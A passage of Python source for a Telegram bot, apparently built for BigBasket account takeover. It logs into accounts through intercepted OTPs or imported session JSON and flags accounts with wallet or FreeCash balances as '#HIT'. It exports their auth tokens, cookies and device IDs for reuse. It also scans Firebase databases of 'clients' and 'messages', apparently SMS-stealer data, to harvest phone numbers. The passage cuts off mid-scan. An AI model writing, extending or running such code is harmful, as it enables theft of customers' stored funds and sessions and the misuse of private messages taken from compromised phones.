            reply_markup=get_main_reply_keyboard()
        )
    else:
        await client.close()
        await state.clear()
        await wait_msg.edit_text(
            f"❌ <b>OTP Dispatch Failed ({status})</b>\nPlease try again later.",
            reply_markup=get_main_reply_keyboard()
        )

@dp.message(LoginStates.waiting_for_otp)
async def process_otp_input(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return

    text = message.text.strip()
    if text in ["❌ Cancel", "/cancel"]:
        await cmd_cancel(message, state)
        return

    otp_match = re.search(r'\b(\d{6})\b', text)
    if not otp_match:
        await message.answer("⚠️ <b>Invalid OTP!</b> Please enter the 6-digit numeric OTP:")
        return

    otp = otp_match.group(1)
    chat_id = message.chat.id
    client = active_manual_clients.get(chat_id)

    if not client:
        await state.clear()
        await message.answer("❌ Session expired or not found. Please start over with /login.", reply_markup=get_main_reply_keyboard())
        return

    status_msg = await message.answer("⏳ <i>Verifying OTP & fetching balances...</i>")
    v_res = await client.verify_otp(otp)

    if v_res == "SUCCESS":
        wallet = await client.get_wallet_balance()
        freecash = await client.get_freecash_balance()
        account_data = client.get_account_data(wallet=wallet, freecash=freecash, source="Manual Phone Login")
        
        w_num = parse_numeric(wallet)
        fc_num = parse_numeric(freecash)
        tot_bal = round(w_num + fc_num, 2)
        await status_msg.delete()

        if tot_bal >= 1:
            save_success_account(account_data)

        hit_card_text = format_hit_card(client.mobile, wallet, freecash, firebase_source="Manual Login", resp_time=2.1)
        hit_kb = get_card_hit_keyboard(client.mobile)
        await message.answer(hit_card_text, reply_markup=hit_kb)

        if tot_bal > 50:
            await send_mono_account_json(chat_id, client.mobile, account_data)
            await send_single_account_json(chat_id, client.mobile, account_data)

        await client.close()
        if chat_id in active_manual_clients:
            del active_manual_clients[chat_id]
        await state.clear()

    elif v_res == "INVALID":
        await status_msg.edit_text("❌ <b>Incorrect OTP!</b> Please check and enter the correct 6-digit OTP (or /cancel):")
    else:
        await client.close()
        if chat_id in active_manual_clients:
            del active_manual_clients[chat_id]
        await state.clear()
        await status_msg.edit_text(f"⚠️ <b>Verification failed ({v_res})</b>. Please try again with /login.", reply_markup=get_main_reply_keyboard())

# ==============================================================================
# 🟢 JSON SESSION LOGIN FLOW
# ==============================================================================
@dp.message(Command("json_login"))
@dp.message(F.text == "🟢 JSON LOGIN")
@dp.message(F.text.contains("JSON LOGIN"))
async def prompt_json_login(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    await state.clear()
    await state.set_state(JsonLoginStates.waiting_for_json)
    await message.answer(
        "🟢 <b>JSON Session Login</b>\n\n"
        "Send your BigBasket account JSON string or upload a <code>.json</code> file below:\n\n"
        "<i>Press ❌ Cancel below to abort.</i>",
        reply_markup=get_cancel_reply_keyboard()
    )

@dp.message(JsonLoginStates.waiting_for_json)
async def process_json_input(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    
    if message.text in ["❌ CANCEL", "❌ Cancel", "/cancel"]:
        await cmd_cancel(message, state)
        return

    json_str = ""
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)
        json_str = downloaded_file.read().decode('utf-8', errors='ignore')
    elif message.text:
        json_str = message.text.strip()

    if not json_str:
        await message.answer("⚠️ Please send valid JSON text or upload a .json file.")
        return

    try:
        data = json.loads(json_str)
    except Exception as e:
        await message.answer(f"❌ Invalid JSON format: {e}")
        return

    status_msg = await message.answer("⏳ <i>Processing JSON login and checking live balance...</i>")
    
    accounts_to_check = []
    if isinstance(data, dict):
        if "accounts" in data and isinstance(data["accounts"], list):
            accounts_to_check = data["accounts"]
        else:
            accounts_to_check = [data]
    elif isinstance(data, list):
        accounts_to_check = data

    if not accounts_to_check:
        await status_msg.edit_text("❌ No valid account objects found in JSON.")
        await state.clear()
        return

    for acc in accounts_to_check:
        try:
            rechecked = await recheck_account(acc)
            phone = rechecked.get("phone") or "N/A"
            w = parse_numeric(rechecked.get("wallet_balance", 0))
            fc = parse_numeric(rechecked.get("freecash_balance", 0))
            tot = round(w + fc, 2)
            
            if tot >= 1:
                save_success_account(rechecked)

            hit_card_text = format_hit_card(phone, w, fc, firebase_source="JSON Login", resp_time=1.5)
            hit_kb = get_card_hit_keyboard(phone)
            await message.answer(hit_card_text, reply_markup=hit_kb)

            if tot > 50:
                await send_mono_account_json(message.chat.id, phone, rechecked)
                await send_single_account_json(message.chat.id, phone, rechecked)

        except Exception as err:
            print(f"Error checking account from JSON: {err}")

    await status_msg.delete()
    await state.clear()
    await message.answer("✅ <b>JSON processing complete!</b>", reply_markup=get_main_reply_keyboard())

# ==============================================================================
# 📁 DOWNLOAD & VIEW SUCCESS ACCOUNTS
# ==============================================================================
async def send_single_account_json(chat_id: int, phone: str, acc_data: dict = None):
    """Generates and exports an individual standalone 1/1 JSON file for a specific account."""
    phone_clean = str(phone).strip()
    if not acc_data:
        db_data = load_success_accounts()
        for a in db_data.get("accounts", []):
            if str(a.get("phone", "")).strip() == phone_clean:
                acc_data = a
                break
    
    if not acc_data:
        await bot.send_message(chat_id, f"❌ Account <code>+91 {phone_clean}</code> not found in saved database.")
        return

    bb_token = acc_data.get("bb_token") or ""
    m_id = acc_data.get("m_id") or ""
    w = parse_numeric(acc_data.get("wallet_balance", 0))
    fc = parse_numeric(acc_data.get("freecash_balance", 0))
    tot = round(w + fc, 2)

    single_export = {
        "phone": phone_clean,
        "bb_token": bb_token,
        "customer_hash": acc_data.get("customer_hash"),
        "m_id": m_id,
        "wallet_balance": w,
        "freecash_balance": fc,
        "total_balance": tot,
        "device_id": acc_data.get("device_id"),
        "device_model": acc_data.get("device_model", "Android"),
        "cookies": acc_data.get("cookies", {}),
        "cookie_format": {
            phone_clean: {
                "bbAuthToken": bb_token,
                "mId": m_id,
                "bbVisitorId": acc_data.get("cookies", {}).get("_bb_vid", "")
            }
        },
        "source": acc_data.get("source", "Export"),
        "fetched_at": acc_data.get("fetched_at", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    }

    out_file = BASE_DIR / f"account_{phone_clean}.json"
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(single_export, f, indent=2, ensure_ascii=False)

        badge = "🔥 [#HIT125]" if fc >= 125 else ("🎁 [#HIT]" if fc > 0 else "💰 [#HIT]")
        caption = (
            f"📥 <b>BigBasket Single Account JSON (1/1)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Mobile:</b> <code>+91 {phone_clean}</code>\n"
            f"🎁 <b>FreeCash:</b> ₹{fc} {badge}\n"
            f"💰 <b>BB Wallet:</b> ₹{w} 🪙\n"
            f"💎 <b>Total Usable:</b> ₹{tot} 💵\n"
            f"🕒 <b>Fetched At:</b> {single_export['fetched_at']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <i>Standalone JSON ready for import & bot usage.</i>"
        )
        doc = FSInputFile(str(out_file), filename=f"bb_{phone_clean}.json")
        await bot.send_document(chat_id=chat_id, document=doc, caption=caption)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Failed to export 1/1 JSON: {e}")
    finally:
        if out_file.exists():
            try:
                os.remove(out_file)
            except Exception:
                pass

async def send_filtered_json(chat_id: int, filter_type: str):
    """Exports a filtered JSON file containing only accounts with cash or 125 hits."""
    db_data = load_success_accounts()
    accounts = db_data.get("accounts", [])
    
    if filter_type == "cash":
        filtered = [a for a in accounts if parse_numeric(a.get("freecash_balance", 0)) > 0]
        filename = "bb_cash_accounts.json"
        title = "🎁 <b>BigBasket FreeCash Accounts JSON (Cash Only)</b>"
    elif filter_type == "125":
        filtered = [a for a in accounts if parse_numeric(a.get("freecash_balance", 0)) >= 125]
        filename = "bb_125_hits.json"
        title = "🔥 <b>BigBasket 125 FreeCash Jackpot JSON</b>"
    else:
        filtered = accounts
        filename = "success_accounts.json"
        title = "📁 <b>BigBasket All Saved Accounts Database</b>"

    if not filtered:
        await bot.send_message(chat_id, f"📂 No accounts matching filter (<code>{filter_type}</code>) found.")
        return

    export_data = {
        "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "filter": filter_type,
        "total_accounts": len(filtered),
        "total_wallet": round(sum(parse_numeric(a.get("wallet_balance", 0)) for a in filtered), 2),
        "total_freecash": round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in filtered), 2),
        "total_125_accounts": sum(1 for a in filtered if parse_numeric(a.get("freecash_balance", 0)) >= 125),
        "accounts": filtered
    }

    out_file = BASE_DIR / f"temp_{filename}"
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)

        caption = (
            f"{title}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 <b>Total Accounts:</b> {len(filtered)}\n"
            f"🎁 <b>Total FreeCash:</b> ₹{export_data['total_freecash']}\n"
            f"💰 <b>Total Wallet:</b> ₹{export_data['total_wallet']}\n"
            f"🕒 <b>Exported:</b> {export_data['updated_at']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <i>Filtered database export ready.</i>"
        )
        doc = FSInputFile(str(out_file), filename=filename)
        await bot.send_document(chat_id=chat_id, document=doc, caption=caption)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Failed to export JSON: {e}")
    finally:
        if out_file.exists():
            try:
                os.remove(out_file)
            except Exception:
                pass

@dp.message(Command("download"))
@dp.message(F.text.contains("Download JSON"))
async def cmd_download_json(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    db_data = load_success_accounts()
    accounts = db_data.get("accounts", [])
    count = len(accounts)
    if count == 0:
        await message.answer("📂 <b>No accounts saved yet!</b>\nUse 🔵 <b>Check Firebase</b> or 🟢 <b>Login Number</b> to discover accounts.")
        return

    cash_accs = [a for a in accounts if parse_numeric(a.get("freecash_balance", 0)) > 0]
    hits_125 = [a for a in accounts if parse_numeric(a.get("freecash_balance", 0)) >= 125]

    text = (
        "📁 <b>BigBasket JSON Export Center</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Total Saved (₹1+):</b> {count} accounts\n"
        f"🎁 <b>With FreeCash:</b> {len(cash_accs)} accounts\n"
        f"🔥 <b>₹125 FreeCash Jackpot:</b> {len(hits_125)} accounts\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Select export type or download individual 1/1 JSON:</i>"
    )

    kb_rows = [
        [
            InlineKeyboardButton(text=f"🎁 Cash Only JSON ({len(cash_accs)})", callback_data="dl_cash_only"),
            InlineKeyboardButton(text=f"🔥 125 Hits JSON ({len(hits_125)})", callback_data="dl_125_only")
        ],
        [
            InlineKeyboardButton(text=f"📁 All Saved JSON ({count})", callback_data="dl_all_json")
        ]
    ]

    # Quick 1/1 single account download buttons for up to 6 recent accounts
    if accounts:
        for acc in accounts[-6:]:
            p = acc.get("phone", "N/A")
            fc = acc.get("freecash_balance", 0)
            tag = f"🎁₹{fc}" if fc > 0 else f"💰₹{acc.get('wallet_balance', 0)}"
            kb_rows.append([
                InlineKeyboardButton(text=f"📥 1/1 JSON: +91 {p} ({tag})", callback_data=f"dl_single_{p}")
            ])

    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

@dp.callback_query(F.data == "btn_download")
async def cb_download_json(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await cmd_download_json(callback.message)

@dp.callback_query(F.data.startswith("dl_single_"))
async def cb_download_single(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer("⏳ Generating 1/1 JSON...")
    phone = callback.data.replace("dl_single_", "").strip()
    await send_single_account_json(callback.message.chat.id, phone)

@dp.callback_query(F.data.startswith("hit_info_"))
async def cb_hit_info(callback: CallbackQuery):
    phone = callback.data.replace("hit_info_", "").strip()
    await callback.answer(f"🎯 #HIT Notification for +91 {phone}", show_alert=True)

@dp.callback_query(F.data == "dl_cash_only")
async def cb_dl_cash_only(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer("⏳ Exporting Cash-Only JSON...")
    await send_filtered_json(callback.message.chat.id, "cash")

@dp.callback_query(F.data == "dl_125_only")
async def cb_dl_125_only(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer("⏳ Exporting 125 Hits JSON...")
    await send_filtered_json(callback.message.chat.id, "125")

@dp.callback_query(F.data == "dl_all_json")
async def cb_dl_all_json(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer("⏳ Exporting All JSON...")
    await send_filtered_json(callback.message.chat.id, "all")

@dp.message(Command("single"))
@dp.message(Command("json"))
async def cmd_single_json(message: types.Message):
    if not is_authorized(message.from_user.id):
        return
    parts = message.text.strip().split()
    if len(parts) > 1:
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) >= 10:
            phone = phone[-10:]
            await send_single_account_json(message.chat.id, phone)
            return
    await message.answer("💡 <b>Usage:</b> <code>/single 9876543210</code>\nExports individual 1/1 JSON for that phone number.")

# ==============================================================================
# 🔥 125 FREECASH HITS VIEWER
# ==============================================================================
@dp.message(Command("hits"))
@dp.message(F.text.contains("125 FreeCash"))
async def cmd_hits_125(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    db_data = load_success_accounts()
    accounts = db_data.get("accounts", [])
    hits = [a for a in accounts if parse_numeric(a.get("freecash_balance", 0)) >= 125]
    count = len(hits)

    if count == 0:
        await message.answer(
            "🔴 🔥 <b>No ₹125 FreeCash accounts found yet!</b>\n\n"
            "💡 <i>Use 🔵 <b>Check Firebase</b> to scan numbers silently in background for ₹125 FreeCash #HITs.</i>"
        )
        return

    total_125_val = round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in hits), 2)
    lines = [
        "╔═════════════════════════════════════╗",
        f"   🎯 #HIT125 • <b>125 FREECASH JACKPOTS ({count})</b> 🎉",
        "╚═════════════════════════════════════╝\n",
        "🎊 <b>Active Accounts with ₹125+ FreeCash:</b>\n"
    ]

    for idx, acc in enumerate(hits, 1):
        p = acc.get("phone", "N/A")
        fc = acc.get("freecash_balance", 0)
        w = acc.get("wallet_balance", 0)
        dt = acc.get("fetched_at", "N/A")
        lines.append(
            f"{idx}. 🎯 <b>#HIT125 +91 {p}</b>\n"
            f"   🎁 FreeCash: <b>₹{fc}</b> | 💰 Wallet: <b>₹{w}</b>\n"
            f"   🕒 <i>Checked: {dt}</i>\n"
            f"   📱 Click to Copy: <code>{p}</code>\n"
        )

    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"💎 <b>Total Jackpot Value: ₹{total_125_val}</b>")
    lines.append("<i>Tap any account number to copy it, or tap 1/1 JSON button below:</i>")

    kb_rows = [
        [
            InlineKeyboardButton(text="🔥 Download 125 Hits JSON", callback_data="dl_125_only")
        ]
    ]
    for acc in hits[-5:]:
        p = acc.get("phone", "N/A")
        kb_rows.append([
            InlineKeyboardButton(text=f"📥 Download 1/1: +91 {p} (₹125)", callback_data=f"dl_single_{p}")
        ])

    await message.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

@dp.callback_query(F.data == "btn_hits_125")
async def cb_hits_125(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await cmd_hits_125(callback.message)

# ==============================================================================
# 📋 VIEW ALL SAVED ACCOUNTS (₹1+)
# ==============================================================================
@dp.message(Command("accounts"))
@dp.message(F.text.contains("Saved Accounts"))
async def cmd_view_accounts(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    db_data = load_success_accounts()
    accounts = db_data.get("accounts", [])
    count = len(accounts)

    if count == 0:
        await message.answer(
            "📋 <b>No accounts saved yet!</b>\n"
            "💡 <i>Use 🔵 <b>Check Firebase</b> or 🟢 <b>Login Number</b> to discover active accounts.</i>"
        )
        return

    lines = [
        "╔═══════════════════════════════════════╗",
        f"   📋 <b>SAVED ACCOUNTS VAULT ({count})</b>",
        "╚═══════════════════════════════════════╝\n",
        "<i>Showing recent active accounts with usable balance:</i>\n"
    ]
    display_accounts = accounts[-20:]
    for idx, acc in enumerate(display_accounts, 1):
        p = acc.get("phone", "N/A")
        w = acc.get("wallet_balance", 0)
        fc = acc.get("freecash_balance", 0)
        hit_tag = " 🎯 <b>[#HIT125]</b>" if parse_numeric(fc) >= 125 else " 🎯 <b>[#HIT]</b>"
        lines.append(f"<code>{idx:02d}.</code> 📱 <code>+91 {p}</code> │ 💰 ₹{w} │ 🎁 ₹{fc}{hit_tag}")

    if count > 20:
        lines.append(f"\n<i>... and {count - 20} more accounts in vault. Use 📁 Download JSON for full file.</i>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"🔥 <b>125 FreeCash Hits:</b> <code>{db_data.get('total_125_accounts', 0)}</code>")
    lines.append(f"💰 <b>Total Wallet Pool:</b> <code>₹{db_data.get('total_wallet', 0)}</code>")
    lines.append(f"🎁 <b>Total FreeCash Pool:</b> <code>₹{db_data.get('total_freecash', 0)}</code>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("💡 <i>Commands: /download (export JSON) • /hits (₹125 hits only)</i>")

    await message.answer("\n".join(lines))

@dp.callback_query(F.data == "btn_accounts")
async def cb_view_accounts(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await cmd_view_accounts(callback.message)

# ==============================================================================
# ⚡ LIVE RE-CHECK SAVED ACCOUNTS
# ==============================================================================
@dp.message(Command("recheck"))
@dp.message(F.text.contains("Live Re-Check"))
@dp.message(F.text.contains("Re-Check"))
async def cmd_recheck(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    db_data = load_success_accounts()
    accounts = db_data.get("accounts", [])
    if not accounts:
        await message.answer("ℹ️ <b>No saved accounts to re-check.</b>", reply_markup=get_main_reply_keyboard())
        return

    status_msg = await message.answer(f"⚡ <i>Starting live re-check of {len(accounts)} accounts...</i>")
    
    updated_accounts = []
    removed_count = 0
    total_125 = 0

    for idx, acc in enumerate(accounts, 1):
        phone = acc.get("phone", "N/A")
        try:
            await status_msg.edit_text(f"⚡ <i>Re-checking account {idx}/{len(accounts)} (+91 {phone})...</i>")
            rechecked = await recheck_account(acc)
            tot = parse_numeric(rechecked.get("wallet_balance", 0)) + parse_numeric(rechecked.get("freecash_balance", 0))
            if tot >= 1:
                updated_accounts.append(rechecked)
                if parse_numeric(rechecked.get("freecash_balance", 0)) >= 125:
                    total_125 += 1
            else:
                removed_count += 1
        except Exception:
            if (parse_numeric(acc.get("wallet_balance", 0)) + parse_numeric(acc.get("freecash_balance", 0))) >= 1:
                updated_accounts.append(acc)

    save_data = {
        "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_accounts": len(updated_accounts),
        "total_wallet": round(sum(parse_numeric(a.get("wallet_balance", 0)) for a in updated_accounts), 2),
        "total_freecash": round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in updated_accounts), 2),
        "total_125_accounts": total_125,
        "accounts": updated_accounts
    }
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(save_data, f, indent=2, ensure_ascii=False)

    report = (
        "⚡ <b>LIVE RE-CHECK COMPLETE!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Checked: <b>{len(accounts)}</b>\n"
        f"✅ Active (₹1+ Balance): <b>{len(updated_accounts)}</b>\n"
        f"🧹 Purged (Dropped to ₹0): <b>{removed_count}</b>\n"
        f"🔥 125 FreeCash Hits: <b>{total_125}</b>\n"
        f"💰 Active Wallet Total: <b>₹{save_data['total_wallet']}</b>\n"
        f"🎁 Active FreeCash Total: <b>₹{save_data['total_freecash']}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💾 <i>Database updated & clean!</i>"
    )
    await status_msg.edit_text(report)

@dp.callback_query(F.data == "btn_recheck")
async def cb_recheck(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await cmd_recheck(callback.message)

# ==============================================================================
# 🧹 PURGE ZERO BALANCE ACCOUNTS
# ==============================================================================
@dp.message(Command("purge"))
@dp.message(F.text.contains("Purge"))
async def cmd_purge_zero(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    removed, valid_count = purge_zero_accounts()
    db_data = load_success_accounts()
    text = (
        "🧹 <b>ZERO-BALANCE PURGE COMPLETE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🗑️ Removed ₹0 Accounts: <b>{removed}</b>\n"
        f"✅ Retained (₹1+ Balance): <b>{valid_count}</b>\n"
        f"🔥 125 FreeCash Hits: <b>{db_data.get('total_125_accounts', 0)}</b>\n"
        f"💰 Total Wallet: <b>₹{db_data.get('total_wallet', 0)}</b>\n"
        f"🎁 Total FreeCash: <b>₹{db_data.get('total_freecash', 0)}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✨ <i>All zero-balance accounts have been purged!</i>"
    )
    await message.answer(text)

# ==============================================================================
# 📊 STATISTICS & DATABASE VAULT OVERVIEW
# ==============================================================================
@dp.message(Command("stats"))
@dp.message(F.text.contains("Stats"))
@dp.message(F.text.contains("Statistics"))
async def cmd_stats(message: types.Message):
    if not is_authorized(message.from_user.id):
        return

    db_data = load_success_accounts()
    total_acc = db_data.get("total_accounts", 0)
    total_125 = db_data.get("total_125_accounts", 0)
    total_w = db_data.get("total_wallet", 0)
    total_fc = db_data.get("total_freecash", 0)
    comb = round(total_w + total_fc, 2)
    updated = db_data.get("updated_at") or "Never"

    text = (
        "╔═══════════════════════════════════════╗\n"
        "   🟣 📊 <b>DATABASE VAULT OVERVIEW</b> 📊 🟣\n"
        "╚═══════════════════════════════════════╝\n\n"
        "💎 <b>ASSET METRICS:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>₹125 FreeCash Hits:</b>   <code>{total_125}</code>\n"
        f"👥 <b>Active Accounts (₹1+):</b>  <code>{total_acc}</code>\n"
        f"🎁 <b>Total FreeCash Pool:</b>   <code>₹{total_fc}</code>\n"
        f"💰 <b>Total Wallet Pool:</b>     <code>₹{total_w}</code>\n"
        f"💎 <b>Combined Asset Value:</b>  <code>₹{comb}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛡️ <b>STORAGE & INTEGRITY:</b>\n"
        f"📁 <b>Database File:</b> <code>{JSON_FILE.name}</code>\n"
        f"🕒 <b>Last Synchronized:</b> <code>{updated}</code>\n"
        f"🔒 <b>Filter Policy:</b> <code>Strict ₹1+ (Auto-Purge ₹0)</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 <i>Commands: /accounts (view all) • /download (export JSON)</i>"
    )
    await message.answer(text)

@dp.callback_query(F.data == "btn_stats")
async def cb_stats(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await cmd_stats(callback.message)

# ==============================================================================
# 🗑️ CLEAR DATABASE FLOW
# ==============================================================================
@dp.message(Command("clear"))
@dp.message(F.text.contains("Clear Database"))
async def cmd_clear(message: types.Message):
    if not is_authorized(message.from_user.id):
        return
    await message.answer(
        "⚠️ <b>Warning! Clear Database Confirmation</b>\n\n"
        "Are you sure you want to clear all saved accounts in <code>success_accounts.json</code>?\n"
        "<i>This action will delete all saved accounts from memory.</i>",
        reply_markup=get_clear_confirm_inline_keyboard()
    )

@dp.callback_query(F.data == "btn_clear_confirm")
async def cb_clear_confirm(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await callback.message.answer(
        "⚠️ <b>Warning! Clear Database Confirmation</b>\n\n"
        "Are you sure you want to clear all saved accounts in <code>success_accounts.json</code>?\n"
        "<i>This action will delete all saved accounts from memory.</i>",
        reply_markup=get_clear_confirm_inline_keyboard()
    )

@dp.callback_query(F.data == "btn_clear_yes")
async def cb_clear_yes(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    clear_success_accounts()
    await callback.message.edit_text("🗑️ <b>All saved database accounts cleared successfully!</b>")

@dp.callback_query(F.data == "btn_clear_no")
async def cb_clear_no(callback: CallbackQuery):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await callback.message.edit_text("❌ Clear operation cancelled.")

# ==============================================================================
# 🔗 FIREBASE BACKGROUND SCANNER ENGINE
# ==============================================================================
@dp.message(Command("firebase"))
@dp.message(F.text.contains("Check Firebase"))
async def prompt_firebase(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return

    chat_id = message.chat.id
    scan = active_scans.get(chat_id)
    if scan and scan.is_running:
        await message.answer(
            "⚠️ <b>Background scan is currently running!</b>\n\n"
            f"📱 <b>Progress:</b> {scan.total_scanned}/{scan.total_valid_phones} numbers\n"
            f"🎯 <b>Total #HITs:</b> {scan.total_hits}\n\n"
            "<i>Use the controls below:</i>",
            reply_markup=get_background_scan_keyboard()
        )
        return

    await state.set_state(FirebaseStates.waiting_for_url)
    await message.answer(
        "🔵 🔗 <b>Firebase Background Scanner</b>\n\n"
        "Send your Firebase Realtime Database URL(s) below (one per line):\n"
        "<i>Example:</i>\n"
        "<code>https://your-project.firebaseio.com/</code>\n\n"
        "<i>The bot will scan numbers silently in the background and notify you on every 🎯 #HIT!</i>",
        reply_markup=get_cancel_reply_keyboard()
    )

@dp.callback_query(F.data == "btn_check_firebase")
async def cb_firebase(callback: CallbackQuery, state: FSMContext):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()

    chat_id = callback.message.chat.id
    scan = active_scans.get(chat_id)
    if scan and scan.is_running:
        await callback.message.answer(
            "⚠️ <b>Background scan is currently running!</b>\n\n"
            f"📱 <b>Progress:</b> {scan.total_scanned}/{scan.total_valid_phones} numbers\n"
            f"🎯 <b>Total #HITs:</b> {scan.total_hits}\n\n"
            "<i>Use the controls below:</i>",
            reply_markup=get_background_scan_keyboard()
        )
        return

    await state.set_state(FirebaseStates.waiting_for_url)
    await callback.message.answer(
        "🔵 🔗 <b>Firebase Background Scanner</b>\n\n"
        "Send your Firebase Realtime Database URL(s) below (one per line):\n"
        "<code>https://your-project.firebaseio.com/</code>\n\n"
        "<i>The bot will scan numbers silently in the background and notify you on every 🎯 #HIT!</i>",
        reply_markup=get_cancel_reply_keyboard()
    )

@dp.message(FirebaseStates.waiting_for_url)
@dp.message(StateFilter(None), F.text)
async def process_firebase_urls(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return

    text = message.text.strip()
    if text in ["❌ Cancel", "/cancel"]:
        await cmd_cancel(message, state)
        return

    raw_links = text.split("\n")
    valid_links = [parse_firebase_link(l.strip()) for l in raw_links if parse_firebase_link(l.strip())]

    if not valid_links:
        await message.answer(
            "💡 <i>Please send valid Firebase database links (e.g., <code>https://my-app.firebaseio.com/</code>) or select a menu button.</i>",
            reply_markup=get_main_reply_keyboard()
        )
        return

    await state.clear()

    chat_id = message.chat.id
    scan = active_scans.get(chat_id)
    if scan and scan.is_running:
        await message.answer(
            "⚠️ <b>Background scan is already running!</b>",
            reply_markup=get_background_scan_keyboard()
        )
        return

    val_msg = await message.answer("🔍 <i>Validating Firebase connection(s)...</i>")
    working_links = []
    
    async with aiohttp.ClientSession() as session:
        for url in valid_links:
            try:
                async with session.get(f"{url}clients.json?shallow=true", timeout=5) as r:
                    if r.status == 200:
                        working_links.append(url)
            except Exception:
                pass

    if not working_links:
        await val_msg.edit_text(
            "❌ <b>Validation Failed!</b> None of the provided Firebase links responded.",
            reply_markup=get_main_reply_keyboard()
        )
        return

    await val_msg.delete()

    # Create & Launch Background Task
    scan_info = BackgroundScanTask(
        is_running=True,
        start_time=datetime.now(),
        working_links=working_links
    )
    active_scans[chat_id] = scan_info
    scan_info.task = asyncio.create_task(
        run_firebase_scan_background(chat_id, message.from_user.id, scan_info)
    )

    await message.answer(
        f"✅ <b>{len(working_links)} Firebase Running Successfully!</b>\n\n"
        "<i>Scanning in background... All hits will be delivered here directly.</i>",
        reply_markup=get_main_reply_keyboard()
    )

async def run_firebase_scan_background(chat_id: int, user_id: int, scan_info: BackgroundScanTask):
    try:
        async with aiohttp.ClientSession() as session:
            all_targets = []
            for url in scan_info.working_links:
                if scan_info.cancelled:
                    break
                try:
                    async with session.get(f"{url}clients.json", timeout=10) as r:
                        clients_data = await r.json() or {}
                    
                    online_devices = [
                        cid for cid, cdata in clients_data.items() 
                        if isinstance(cdata, dict) and cdata.get("status") is True
                    ]
                    del clients_data
                    gc.collect()

                    if not online_devices:
                        continue

                    seen_phones = set()
                    for cid in online_devices:
                        if scan_info.cancelled:
                            break
                        try:
                            async with session.get(f"{url}messages/{cid}.json?orderBy=\"$key\"&limitToLast=10", timeout=5) as m_req:
                                msgs = await m_req.json()
                                phone = extract_phone(msgs) if msgs else None
                                if phone and phone not in seen_phones:
                                    seen_phones.add(phone)
